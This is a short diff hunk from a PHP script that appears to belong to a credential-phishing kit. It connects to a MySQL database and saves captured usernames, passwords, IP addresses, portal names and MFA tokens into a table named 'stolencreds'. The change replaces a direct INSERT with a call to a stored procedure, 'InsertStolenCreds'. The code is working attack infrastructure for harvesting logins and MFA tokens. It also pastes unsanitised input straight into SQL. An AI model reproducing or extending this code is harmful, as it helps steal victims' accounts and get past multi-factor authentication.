@@ -82,7 +82,7 @@ $conn->close();
 $conn2 = mysqli_connect($servername, $username, $password, $dbname);
 
 // Inserts Captured Information Into MySQL DB
-$sql = "INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES('$user','$pass',NOW(),'$ip','$portal','$MFAToken');";
+$sql = "CALL InsertStolenCreds('$user','$pass','$ip','$portal','$MFAToken');";
 $result = $conn2->query($sql);
 
 printf($conn2->error);
